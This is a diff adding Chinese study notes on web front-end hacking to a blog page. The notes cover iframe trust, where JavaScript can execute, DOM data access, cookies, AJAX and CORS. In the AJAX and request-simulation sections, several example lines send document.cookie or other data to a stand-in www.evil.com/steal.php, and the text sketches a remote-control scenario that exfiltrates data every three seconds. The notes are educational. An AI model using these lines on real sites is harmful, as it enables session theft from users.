@@ -392,7 +392,129 @@ Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030 00:00:00 GMT
 <p>👇嵌入广告页面</p>
 <p><img src="%E3%80%8AWeb%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/screenshot%204.png" alt="screenshot 4"></p>
 <p>还有Web 2.0网站中嵌入的许多第三方Web游戏与应用，都有使用到iframe。iframe标签带来了很多便利，同时也带来了很多风险，比如攻击者入侵一个网站后，可以通过iframe嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行，<strong>这就是由信任关系导致的安全问题</strong></p>
-<p>iframe标签还有一些有趣的安全话题，当网站页面使用iframe方式嵌入一个页面时，我们约定网站页面是父页，而被嵌入的这个页面是子页，如图2-1所示。那么父页与子页之间如何跨文档读写数据</p>
+<p>iframe标签还有一些有趣的安全话题，当网站页面使用iframe方式嵌入一个页面时，约定网站页面是父页，而被嵌入的这个页面是子页</p>
+<p><strong>❓父页与子页之间如何跨文档读写数据</strong></p>
+<p><img src="%E3%80%8AWeb%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/screenshot%205.png" alt="screenshot 5"></p>
+<p>如果父页和子页之间是同域，父页可以通过调用子页的<code>contentWindow</code>来操作子页的DOM树，同理子页可以调用父页的<code>contentWindow</code>来操作父页的DOM树。如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的<code>location</code>值进行写操作，这样可以让父页重定向到其他网页，不过对<code>location</code>的操作仅仅只有写权限，而没有读权限，这样就不能获取到父页<code>location URL</code>的内容，否则有可能会造成隐私数据泄漏，比如有的网站将身份认证token存在于URL中</p>
+<h2 id="HTML内嵌脚本执行"><a href="#HTML内嵌脚本执行" class="headerlink" title="HTML内嵌脚本执行"></a>HTML内嵌脚本执行</h2><p>JavaScript脚本除了出现在JavaScript格式文件里，还可以出现在👇情况中</p>
+<ul>
+<li>HTML的<code>&lt;script&gt;&lt;/script&gt;</code>标签内</li>
+<li>HTML的标签on事件中</li>
+<li>一些标签的href、src等属性的伪协议(javascript:等)中</li>
+</ul>
+<p><img src="%E3%80%8AWeb%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/screenshot%206.png" alt="screenshot 6"></p>
+<p>这导致防御XSS变得有些棘手，出现在DOM树的不同位置，面对的防御方案都不太一样。这也为攻击者提供了很大便利，能够执行JavaScript的位置越多，意味着XSS发生的面也越广，XSS漏洞出现的可能性也越大</p>
+<h1 id="跨站之魂JavaScript"><a href="#跨站之魂JavaScript" class="headerlink" title="跨站之魂JavaScript"></a>跨站之魂JavaScript</h1><p>在Web前端安全中，JavaScript控制了整个前端的逻辑，通过JavaScript可以完成许多操作</p>
+<p><strong>❓用户在网站上都有哪些操作</strong></p>
+<p>首先提交内容，然后可以编辑与删除，这些JavaScript几乎都可以完成，为什么是“几乎”？因为碰到提交表单需要验证码的情况，JavaScript就不行了，虽然有HTML5的canvas来辅助，不过效果并不会好</p>
+<p>对跨站师来说，大多数情况下有了XSS漏洞，就意味着可以注入任意的JavaScript，有了JavaScript，就意味着被攻击者的任何操作都可以模拟，任何隐私信息都可以获取到。可以说JavaScript就是跨站之魂</p>
+<h2 id="DOM树操作"><a href="#DOM树操作" class="headerlink" title="DOM树操作"></a>DOM树操作</h2><h3 id="获取HTML内容中的隐私数据"><a href="#获取HTML内容中的隐私数据" class="headerlink" title="获取HTML内容中的隐私数据"></a>获取HTML内容中的隐私数据</h3><p><strong>👇要获取的隐私数据是用户的私信内容</strong></p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Title&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div&gt;a&lt;/div&gt;
+&lt;div&gt;b&lt;/div&gt;
+&lt;div id=&quot;private_msg&quot;&gt;
+    隐私数据在这
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>在这个DOM树中，<code>id=&quot;private_msg&quot;</code>的标签节点包含用户的私信内容，通过JavaScript可以非常简单地获取</p>
+<pre><code class="javascript">document.getElementById(&#39;private_msg&#39;).innerHTML;</code></pre>
+<p><code>document</code>对象代表整个DOM，<code>getElementById</code>函数可以获取指定id号的标签对象，这些标签对象都有一个属性<code>innerHTML</code>，表示标签对象内的HTML数据内容</p>
+<p><strong>❓如果没id号怎么办</strong></p>
+<p>稍微麻烦点可还是非常简单，包含隐私数据的div标签是DOM树从上到下的第3个</p>
+<pre><code class="javascript">document.getElementsByTagName(&#39;div&#39;)[2].innerHTML;</code></pre>
+<p>这时用到的函数是<code>getElementsByTagName</code>，接收标签名参数，返回一个数组，数组下标从0开始，于是第3个表示为[2]</p>
+<h3 id="获取浏览器的Cookies数据"><a href="#获取浏览器的Cookies数据" class="headerlink" title="获取浏览器的Cookies数据"></a>获取浏览器的Cookies数据</h3><p>Cookies中保存了用户的会话信息，通过<code>document.cookie</code>可以获取到，不过并不是所有的Cookies都可以获取</p>
+<h3 id="获取URL地址中的数据"><a href="#获取URL地址中的数据" class="headerlink" title="获取URL地址中的数据"></a>获取URL地址中的数据</h3><p>从<code>window.location</code>或<code>location</code>处可获取URL地址中的数据。除了获取数据，还有通过DOM操作生成新的DOM对象或移除DOM对象</p>
+<h2 id="AJAX风险"><a href="#AJAX风险" class="headerlink" title="AJAX风险"></a>AJAX风险</h2><p>AJAX简直就是前端黑客攻击中必用的技术模式，全称为<code>Asynchronous JavaScript And XML</code>，即异步的JavaScript与XML</p>
+<p><strong>👇AJAX的三个重点</strong></p>
+<ul>
+<li>异步</li>
+<li>JavaScript</li>
+<li>XML</li>
+</ul>
+<p>异步可以理解为单独开启一个线程，独立于浏览器主线程去做自己的事，这样浏览器就不会等待(阻塞)，异步在后台悄悄进行，所以利用AJAX的攻击显得很诡异，无声无息。AJAX本身就是由JavaScript构成的，只是XML并不是必需的，XML在这是指数据传输格式是XML，比如，AJAX发出去的HTTP请求，响应回的数据是XML格式，然后JavaScript去解析这个XML DOM树得到相应节点的内容。其实响应回的数据格式还可以是JSON(主流)、文本、HTML等。AJAX中特别提到XML是因为历史原因</p>
+<p>AJAX的核心对象是<code>XMLHttpRequest</code>(一般简称为xhr)，<code>IE 7</code>之前的浏览器不支持xhr对象，而是通过<code>ActiveXObject</code>来实现</p>
+<p>👇<strong>xhr实例化</strong></p>
+<pre><code class="javascript">var xmlhttp;
+if (window.XMLHttpRequest) {
+    xmlhttp = new XMLHttpRequest() // IE 7+ Firefox, Chrome, Opera, Safari...
+} else {
+    xmlhttp = new ActiveXObject(&#39;Microsoft.XMLHttp&#39;) // IE 6 IE 5
+}</code></pre>
+<p>实例化后设置好回调，然后发送HTTP请求需要的头部与参数键值，待响应成功后会触发该回调，回调函数就可以处理响应回来的数据</p>
+<p><strong>❗️不是任何请求头都可以通过JavaScript进行设置，否则前端的逻辑世界就乱了，W3C给出了一份头部黑名单</strong></p>
+<p><img src="%E3%80%8AWeb%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/screenshot%207.png" alt="screenshot 7"></p>
+<p>这个黑名单是不完备的，也有一些技巧可以绕过黑名单，导致可以任意提交<code>Referer/User-Agent/Cookie</code>等头部值</p>
+<p>响应回的数据也包括头部与体部，通过<code>getResponseHeader</code>函数可以获得指定的响应头，除了<code>Set-Cookie/Set-Cookie2</code>(其中可能设置了<code>HttpOnly</code>标志的Cookie，表示严禁客户端脚本读取)等。更方便的是可以通过<code>getAllResponseHeaders</code>获取所有合法的响应头</p>
+<p>AJAX是严格遵守同源策略的，既不能从另一个域读取数据，也不能发送数据到另一个域</p>
+<p>不过有一种情况，可以发送数据到另一个域，W3C的新标准中，<code>CORS</code>(Cross-Origin Resource Sharing)开始推进浏览器支持跨域方案，现在的浏览器都支持这个方案</p>
+<p><strong>👇跨源过程</strong></p>
+<p><code>www.foo.com</code>(来源域)的AJAX向<code>www.evil.com</code>(目标域)发起了请求，浏览器会给自动带上Origin头</p>
+<pre><code>Origin: http://www.foo.com</code></pre>
+<p>然后目标域要判断这个Origin值，如果是预期的，那么就返回👇表示同意跨域</p>
+<pre><code>Access-Control-Allow-Origin: http://www.foo.com</code></pre>
+<p>如果<code>Access-Control-Allow-Origin</code>之后是<code>*</code>通配符，则表示任意域都可以往目标跨。如果目标域不这样做，浏览器获得响应后没发现<code>Access-Control-Allow-Origin</code>头的存在，就会报类似下面这样的权限错误</p>
+<p><img src="%E3%80%8AWeb%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/screenshot%208.png" alt="screenshot 8"></p>
+<p>IE不使用<code>XMLHttpRequest</code>对象，而是自己的<code>XDomainRequst</code>对象，实例化后使用方式与<code>XMLHttpRequest</code>基本一致</p>
+<p><strong>👇让CORS方案兼容</strong></p>
+<pre><code class="javascript">function createCORSRequest(method, url) {
+    var xhr = new XMLHttpRequest()
+    if (&#39;withCredentials&#39; in xhr) {
+        xhr.open(method, url, true)
+    } else if (typeof XDomainRequest !== &#39;undefined&#39;) {
+        xhr = new XDomainRequest(); // IE
+        xhr.open(method, url)
+    } else {
+        xhr = null
+    }
+    return xhr
+}
+
+var request = createCORSRequest(&#39;get&#39;, &#39;http://www.evil.com/steal.php?data=456&#39;)
+if (request) {
+    request.onload = function () { // 请求成功后
+        alert(request.responseText) // 弹出响应的数据
+    }
+    request.send() // 发送请求
+}</code></pre>
+<p>👆代码存放在<code>www.foo.com</code>域上，跨域往目标域发起请求，👇目标域<code>steal.php</code>的代码</p>
+<pre><code class="php">&lt;?php
+header(&quot;Access-Control-Allow-Origin: http://www.foo.com&quot;);
+//...
+?&gt;</code></pre>
+<p><strong>❓根据这些简陋的代码，可以丰富一下，想想适合怎样的攻击场景</strong></p>
+<p>有一个实时远控的场景，可以将源头域上的隐私数据(每3秒)跨域提交到目标域上，并获取目标域响应的内容，这样的内容可以动态生成，也可以是JavaScript指令，然后在源头域上被eval等方式动态执行</p>
+<p><strong>❓如果目标域不设置<code>Access-Control-Allow-Origin: http://www.foo.com</code>，那么隐私数据会不会被偷到</strong></p>
+<p>答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被目标域的<code>steal.php</code>接收到</p>
+<p>❗️<strong>默认情况下，这样的跨域无法带上目标域的会话(Cookies等)，需要设置xhr实例的<code>withCredentials</code>属性为true(IE还不支持)</strong></p>
+<p>同时目标域的<code>steal.php</code>必须设置👇</p>
+<pre><code class="php">&lt;?php
+header(&quot;Access-Control-Allow-Origin: http://www.foo.com&quot;);
+header(&quot;Access-Control-Allow-Credentials: true&quot;); // 允许跨域证书发送
+//...
+?&gt;</code></pre>
+<p><strong>❗️如果设置<code>Access-Control-Allow-Credentials: true</code>，那么<code>Access-Control-Allow-Origin</code>就不能设置为<code>*</code>通配符，这也是浏览器为了安全进行的考虑</strong></p>
+<p>有了<code>CORS</code>机制，跨域就变得特别方便了，该功能要慎重使用，否则后果会很严重</p>
+<h2 id="模拟用户发起浏览器请求"><a href="#模拟用户发起浏览器请求" class="headerlink" title="模拟用户发起浏览器请求"></a>模拟用户发起浏览器请求</h2><p>在浏览器中用户发出的请求基本上都是HTTP协议里的GET与POST方式。对于GET方式，实际上就是一个URL</p>
+<pre><code class="javascript">//新建一个img标签对象，对象的src属性指向目标地址
+new Image().src=&quot;http://www.evil.com/steal.php&quot;+escape(document.cookie);
+//在地址栏里打开目标地址
+location.href=&quot;http://www.evil.com/steal.php&quot;+escape(document.cookie);</code></pre>
+<p>原理是相通的，通过JavaScript动态创建iframe/frame/script/link等标签对象，然后将它们的src或href属性指向目标地址即可。</p>
+<p>对于POST的请求，<code>XMLHttpRequest</code>对象就是一个非常方便的方式，可以模拟表单提交，它有异步与同步之分，差别在于<code>XMLHttpRequst</code>实例化的对象xhr的open方法的第三个参数</p>
+<ul>
+<li>true表示异步</li>
+<li>false表示同步</li>
+</ul>
+<p>如果使用异步方式，就是AJAX。异步则表示请求发出去后，JavaScript可以去做其他事情，待响应回来后会自动触发xhr对象的<code>onreadystatechange</code>事件，可以监听这个事件以处理响应内容。同步则表示请求发出去后，JavaScript需要等待响应回来，这期间就进入阻塞阶段</p>
+<p><strong>👇一段同步的示例</strong></p>
 
         </div>
         <!-- .entry-content -->
